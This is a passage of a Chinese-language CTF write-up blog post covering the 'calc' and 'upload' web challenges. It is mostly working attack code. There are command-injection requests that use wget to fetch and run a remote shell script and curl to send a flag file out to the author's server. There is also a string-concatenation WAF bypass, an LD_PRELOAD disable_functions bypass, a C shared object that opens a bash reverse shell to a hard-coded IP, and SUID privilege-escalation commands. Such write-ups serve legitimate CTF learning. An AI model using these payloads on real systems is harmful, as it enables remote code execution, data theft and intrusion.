+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8002</span><br></pre></td></tr></table></figure>
+
+<p>wget下载shell.sh到/tmp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /calc?num=1*1%23`wget%09-P%09/tmp%09http://yenan.club:8002/shell.sh` HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>给权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /calc?num=1*1%23`chmod%09777%09/tmp/shell.sh` HTTP/1.1</span><br><span class="line">GET /calc?num=1*1%23`chmod%09+x%09/tmp/shell.sh` HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /calc?num=1*1%23`/tmp/shell.sh` HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>获得shell</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036232.png" alt="image-20220326202804646" style="zoom: 67%;" />
+
+<p>或者</p>
+<p>先写到tmp下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /calc?num=1*1%23`cat%09/*%09&gt;%09/tmp/flag` HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>然后外带</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /calc?num=1*1%23`curl%09-d%09@/tmp/flag%09http://yenan.club:18888` </span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036234.png" alt="image-20220326204603974" style="zoom:67%;" />
+
+<p>积累两个命令：</p>
+<p>把本地的/flag外带到vps</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d @/flag http://vps:port</span><br></pre></td></tr></table></figure>
+
+<p>下载vps的脚本到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -P /tmp http://vps:port/file</span><br></pre></td></tr></table></figure>
+
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>用字符串拼接绕过waf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;fi&#x27;</span>.<span class="string">&#x27;le_get_contents&#x27;</span>)(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里直接读flag没权限，所以得RCE后续还得提权，后面如果执行命令的话得考虑反弹shell，外带没用了</p>
+<p>读到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">light</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glow</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">onsubmit</span>=&quot;<span class="title">return</span> <span class="title">checkFile</span>()&quot;&gt;</span></span><br><span class="line"><span class="class">    嘿伙计，传个火？！</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">upload</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">flare</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">fun</span>($<span class="title">var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fun</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>phpinfo没被waf，可以直接上传后查看，搜disable_functions，发现禁用挺多，执行命令的都禁用了，够呛能直接执行或者连webshell了。把disable复制到记事本，搜函数，发现有mail()和putenv()，因此可以使用bypass disable_function的LD_PRELOAD方法，就差一个加载so文件了。</p>
+<p>但我尝试在题目给的上传接口传so文件，都不能通过waf检验，查看burp发的包发现glibc编译有(ubuntu14.04~ubuntu20.04)</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036235.png" alt="image-20220326234959607" style="zoom:67%;" />
+
+<p>这是少不了的东西，但一下好几个waf的字符，就放弃从给的上传口子上传。</p>
+<p>其实我们提交任何上传文件的请求到php文件的时候，都会在临时目录（/tmp）生成一个<code>php??????</code>（六个随机字符）的文件，并且在脚本执行结束自动删除，我们直接使用临时文件来给LD_PRELOAD即可。</p>
+<p>但是php临时文件名字随机，要确切知道的话需要爆破，这里用原生类来解决获取php临时文件名字的问题，再用刚才的那个任意文件读取的字符串拼接方法绕过waf对putenv()的上传限制，最后用glob://协议来匹配处随机名字的临时文件，glob这里表示循环所有php开头后面六个字符的文件。</p>
+<p>使用putenv()来指定LD_PRELOAD的值，然后再利用文件上传的临时文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="string">&#x27;put&#x27;</span>.<span class="string">&#x27;env&#x27;</span>)(<span class="string">&quot;LD_PRELOAD=/tmp/&quot;</span>.(<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///tmp/php??????&quot;</span>)));</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传shell.php后访问传的php文件以执行</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036236.png" alt="image-20220326235257635" style="zoom:67%;" />
+
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://380bb2af-a2a7-4a6c-873d-92a4ce3cd478.node4.buuoj.cn:81/uploads/25a452927110e39a345a2511c57647f2.php</span><br></pre></td></tr></table></figure>
+
+<p>给任何php传都会有临时文件，但只有给在执行的这个恶意php传，才能在删除之前被加载</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://380bb2af-a2a7-4a6c-873d-92a4ce3cd478.node4.buuoj.cn:81/uploads/25a452927110e39a345a2511c57647f2.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036237.png" alt="image-20220326235415818" style="zoom: 80%;" />
+
+<p>在这传exp.so，提前监听，即可反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>exp.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = <span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/81.70.59.112/18888 0&gt;&amp;1\&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">system(cmdline); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>脚本：system函数默认是sh -c 来执行命令，而debian系的Linux /bin/sh 链接到了/bin/dash   redhat系则是链接到了 /bin/bash，本题这里必须加，耽误了好长时间，以后都加上就行。以及cmdline里面的 \ 是为了转义 “ 防止过早闭合。使用for循环修改LD_PRELOAD的首个字符改成<code>\0</code>，即C语言字符串结束标记，原因是unsetenv(“LD_PRELOAD”)在某些Linux发行版不一定生效（如CentOS），这样一个小动作能够让系统原有的LD_PRELOAD环境变量自动失效</p>
+<p>详解：<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>
+
+<p>上传即可反弹到shell，直接cat /flag没权限</p>
+<p>suid提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">nl /flag</span><br></pre></td></tr></table></figure>
+
+<p>搜的时间比较长</p>
+<p>上次见的提权是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comm /flag /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036238.png" alt="image-20220326233057360" style="zoom: 80%;" />
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DASCTF-X-SU"><span class="toc-number">1.</span> <span class="toc-text">DASCTF X SU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpop"><span class="toc-number">1.1.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#calc"><span class="toc-number">1.2.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload"><span class="toc-number">1.3.</span> <span class="toc-text">upload</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/27/dasctf-su/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/27/dasctf-su/&text=dasctf*su"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/27/dasctf-su/&is_video=false&description=dasctf*su"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dasctf*su&body=Check out this article: https://yenannn.github.io/2022/03/27/dasctf-su/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/27/dasctf-su/&name=dasctf*su&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/27/dasctf-su/&t=dasctf*su"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Yenan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
